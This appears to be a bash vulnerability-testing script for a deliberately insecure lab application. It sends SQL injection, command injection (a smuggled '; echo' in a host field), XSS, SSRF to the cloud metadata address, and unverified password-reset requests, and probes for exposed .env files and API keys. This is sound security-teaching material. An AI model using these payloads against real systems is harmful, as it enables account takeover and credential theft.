#!/bin/bash

# DevSecOps Project - Vulnerability Testing Script
# This script tests various OWASP vulnerabilities

TARGET="${1:-http://localhost:3000}"

echo "🔓 Testing OWASP Vulnerabilities"
echo "================================"
echo "Target: $TARGET"
echo ""

# Test 1: SQL Injection - Login Bypass
echo "1️⃣  Testing SQL Injection (Login Bypass)..."
response=$(curl -s -X POST "$TARGET/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin' OR '1'='1&password=anything")
if echo "$response" | grep -q "Login successful"; then
    echo "✅ SQL Injection successful - Login bypassed"
else
    echo "❌ SQL Injection failed"
fi
echo ""

# Test 2: SQL Injection - Data Extraction
echo "2️⃣  Testing SQL Injection (Data Extraction)..."
response=$(curl -s -X POST "$TARGET/search" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "query=' OR '1'='1")
if echo "$response" | grep -q "Search Results"; then
    echo "✅ SQL Injection successful - Data extracted"
else
    echo "❌ SQL Injection failed"
fi
echo ""

# Test 3: Broken Access Control
echo "3️⃣  Testing Broken Access Control..."
response=$(curl -s "$TARGET/user/1")
if echo "$response" | grep -q "password"; then
    echo "✅ Broken Access Control - Sensitive data exposed"
else
    echo "❌ Access control test failed"
fi
echo ""

# Test 4: Sensitive Data Exposure
echo "4️⃣  Testing Sensitive Data Exposure..."
response=$(curl -s "$TARGET/api/keys")
if echo "$response" | grep -q "api_key"; then
    echo "✅ Sensitive Data Exposed - API keys visible"
else
    echo "❌ Sensitive data test failed"
fi
echo ""

# Test 5: Security Misconfiguration
echo "5️⃣  Testing Security Misconfiguration..."
response=$(curl -s "$TARGET/.env")
if echo "$response" | grep -q "PASSWORD"; then
    echo "✅ Security Misconfiguration - .env file accessible"
else
    echo "❌ Security misconfiguration test failed"
fi
echo ""

# Test 6: Debug Endpoint
echo "6️⃣  Testing Debug Endpoint..."
response=$(curl -s "$TARGET/debug")
if echo "$response" | grep -q "env"; then
    echo "✅ Debug Endpoint Exposed - Environment variables visible"
else
    echo "❌ Debug endpoint test failed"
fi
echo ""

# Test 7: Command Injection
echo "7️⃣  Testing Command Injection..."
response=$(curl -s -X POST "$TARGET/ping" \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; echo VULNERABLE"}')
if echo "$response" | grep -q "VULNERABLE"; then
    echo "✅ Command Injection successful"
else
    echo "⚠️  Command Injection test inconclusive"
fi
echo ""

# Test 8: XSS
echo "8️⃣  Testing XSS (Cross-Site Scripting)..."
response=$(curl -s "$TARGET/search?q=<script>alert('XSS')</script>")
if echo "$response" | grep -q "<script>"; then
    echo "✅ XSS Vulnerability - Script tag not sanitized"
else
    echo "❌ XSS test failed"
fi
echo ""

# Test 9: SSRF
echo "9️⃣  Testing SSRF (Server-Side Request Forgery)..."
response=$(curl -s -X POST "$TARGET/fetch-url" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}')
if echo "$response" | grep -q "ami-id\|instance-id"; then
    echo "✅ SSRF Vulnerability - Internal metadata accessible"
else
    echo "⚠️  SSRF test inconclusive"
fi
echo ""

# Test 10: Insecure Design - Password Reset
echo "🔟 Testing Insecure Password Reset..."
response=$(curl -s -X POST "$TARGET/reset-password" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&newPassword=hacked123")
if echo "$response" | grep -q "successful"; then
    echo "✅ Insecure Design - Password reset without verification"
else
    echo "❌ Password reset test failed"
fi
echo ""

echo "================================"
echo "✅ Vulnerability testing complete!"
echo ""
echo "⚠️  WARNING: These vulnerabilities are intentional"
echo "    Never deploy this application to production!"
echo ""
